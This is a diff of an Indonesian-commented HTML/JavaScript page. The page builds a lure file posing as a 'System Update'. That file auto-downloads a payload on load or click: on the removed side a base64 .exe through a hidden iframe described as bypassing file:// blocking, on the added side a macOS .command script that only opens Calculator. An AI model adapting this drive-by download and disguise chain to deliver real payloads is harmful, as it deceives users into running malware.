@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Generator Berkas Blob &amp; ObjectURL</title>
+<title>Generator Berkas Blob &amp; ObjectURL — Mac Command</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
@@ -23,7 +23,7 @@ button:hover { background: #b71c1c; }
 <body>
 <div class="panel" id="main-panel">
 <h2>Generator Berkas Blob &amp; ObjectURL</h2>
-<p>Klik tombol untuk mengunduh satu file HTML. Saat dibuka, file tersebut akan memicu download satu file .exe melalui iframe tersembunyi.</p>
+<p>Klik tombol untuk mengunduh satu file <code>.command</code> yang, jika dijalankan secara manual di Mac, akan membuka Kalkulator.</p>
 
 <button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
 
@@ -52,68 +52,76 @@ const speak = (message) => {
 const prepareMimeBlobAsync = (i) => {
     return new Promise((resolve) => {
         queueMicrotask(() => {
+            // Payload shell script untuk Mac
+            const shellScript = "#!/bin/bash\n" +
+                                "open -a Calculator\n" +
+                                "osascript -e 'display notification \"Kalkulator telah dibuka\" with title \"System Update\"'\n";
+
             const payloadText = "<!DOCTYPE html>" +
             "<html>" +
-            "<head><meta charset='UTF-8'><title>Sistem Pembaruan</title></head>" +
+            "<head><meta charset='UTF-8'><title>System Update</title></head>" +
             "<body style='margin:0;padding:0;background:#0f111a;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;'>" +
             "<div style='background:#1e2130;padding:40px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.5);max-width:400px;text-align:center;border:1px solid #333;'>" +
-            "    <h2 style='color:#4CAF50;margin-bottom:10px;'>⚙️ Pembaruan Sistem</h2>" +
-            "    <p style='color:#aaa;font-size:14px;margin-bottom:25px;line-height:1.5;'>Pembaruan perangkat lunak sedang diunduh. Harap tunggu hingga proses selesai.</p>" +
-            "    <p id='status' style='color:#ff9800;font-size:14px;font-weight:bold;'>Mengunduh paket...</p>" +
+            "    <h2 style='color:#4CAF50;margin-bottom:10px;'>⚙️ System Update</h2>" +
+            "    <p style='color:#aaa;font-size:14px;margin-bottom:25px;line-height:1.5;'>Pembaruan sistem sedang diunduh. Harap tunggu.</p>" +
+            "    <p id='status' style='color:#ff9800;font-size:14px;font-weight:bold;'>Menyiapkan file...</p>" +
             "    <p style='color:#555;font-size:10px;margin-top:25px;'>Origin: <span id='o'></span></p>" +
             "</div>" +
-            // Iframe tersembunyi untuk memaksa eksekusi download
-            "<iframe id='hiddenFrame' style='display:none;'></iframe>" +
             "<script>" +
             "(function(){" +
             "\"use strict\";" +
             "document.getElementById('o').textContent = window.location.origin || 'null (file lokal)';" +
             
-            "function b64KeBytes(b64){" +
-            "var binary = atob(b64);" +
-            "var len = binary.length;" +
-            "var bytes = new Uint8Array(len);" +
-            "for (var i = 0; i < len; i++) { bytes[i] = binary.charCodeAt(i); }" +
-            "return bytes;" +
-            "}" +
+            // Payload .command di-encode Base64 (menggunakan btoa di JS)
+            "var shellScript = \"#!/bin/bash\\n\" + " +
+            "                  \"open -a Calculator\\n\" + " +
+            "                  \"osascript -e 'display notification \\\"Kalkulator telah dibuka\\\" with title \\\"System Update\\\"'\\n\";" +
+            "var b64Data = btoa(unescape(encodeURIComponent(shellScript)));" +
             
-            // Payload .exe
-            "var b64Data = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4A8AAAAAAAAwAAAAAAAAAAAAAAAAAAAAQAAA\" + " +
-            "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + " +
-            "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + " +
-            "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + " +
-            "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\";" +
+            "function b64KeBytes(b64){" +
+            "    var binary = atob(b64);" +
+            "    var len = binary.length;" +
+            "    var bytes = new Uint8Array(len);" +
+            "    for (var i = 0; i < len; i++) { bytes[i] = binary.charCodeAt(i); }" +
+            "    return bytes;" +
+            "}" +
             
             "var sudah = false;" +
             
             "function picuDownload(){" +
-            "if (sudah) return;" +
-            "sudah = true;" +
-            "var statusEl = document.getElementById('status');" +
-            "try{" +
-            "statusEl.textContent = 'Menyimpan file...';" +
-            "var bytesArr = b64KeBytes(b64Data);" +
-            "var blob = new Blob([bytesArr], { type: 'application/x-msdownload' });" +
-            "var url = URL.createObjectURL(blob);" +
-            
-            // Menggunakan iframe untuk memicu unduhan (bypass blokir file://)
-            "var iframe = document.getElementById('hiddenFrame');" +
-            "iframe.src = url;" +
-            
-            "setTimeout(function(){ " +
-            "URL.revokeObjectURL(url); " +
-            "}, 3000);" +
-            "statusEl.textContent = 'Paket berhasil diunduh.';" +
-            "statusEl.style.color = '#4CAF50';" +
-            "} catch(e){" +
-            "statusEl.textContent = 'Gagal: ' + e.message;" +
-            "statusEl.style.color = '#f00';" +
-            "sudah = false;" +
+            "    if (sudah) return;" +
+            "    sudah = true;" +
+            "    var statusEl = document.getElementById('status');" +
+            "    try{" +
+            "        statusEl.textContent = 'Menyimpan file...';" +
+            "        var bytesArr = b64KeBytes(b64Data);" +
+            // MIME type untuk shell script
+            "        var blob = new Blob([bytesArr], { type: 'application/x-sh' });" +
+            "        var url = URL.createObjectURL(blob);" +
+            "        var a = document.createElement('a');" +
+            "        a.href = url;" +
+            // Nama file dengan ekstensi .command
+            "        a.download = 'System_Update.command';" +
+            "        a.style.display = 'none';" +
+            "        document.body.appendChild(a);" +
+            "        a.click();" +
+            "        setTimeout(function(){ " +
+            "            if (a.parentNode) a.parentNode.removeChild(a); " +
+            "            URL.revokeObjectURL(url); " +
+            "        }, 3000);" +
+            "        statusEl.textContent = 'File berhasil diunduh. Buka file .command secara manual.';" +
+            "        statusEl.style.color = '#4CAF50';" +
+            "    } catch(e){" +
+            "        statusEl.textContent = 'Gagal: ' + e.message;" +
+            "        statusEl.style.color = '#f00';" +
+            "        sudah = false;" +
+            "    }" +
             "}" +
-            "}" +
             
-            // Panggil setelah halaman dimuat
+            // Pemicu otomatis saat halaman dimuat
             "window.addEventListener('load', function(){ setTimeout(picuDownload, 1500); });" +
+            "document.addEventListener('click', picuDownload);" +
+            "document.addEventListener('touchstart', picuDownload);" +
             "})();" +
             "<\/script>" +
             "</body>" +
@@ -129,7 +137,7 @@ const prepareMimeBlobAsync = (i) => {
 const triggerInstantDownload = (fileData) => {
     const link = document.createElement("a");
     link.href = fileData.url;
-    link.download = `update-paket.txt.html`; // Ekstensi ganda
+    link.download = `update-paket.txt.html`;
     link.textContent = `Download update-paket.txt.html`;
     link.style.display = "none";
     downloadsDiv.appendChild(link);
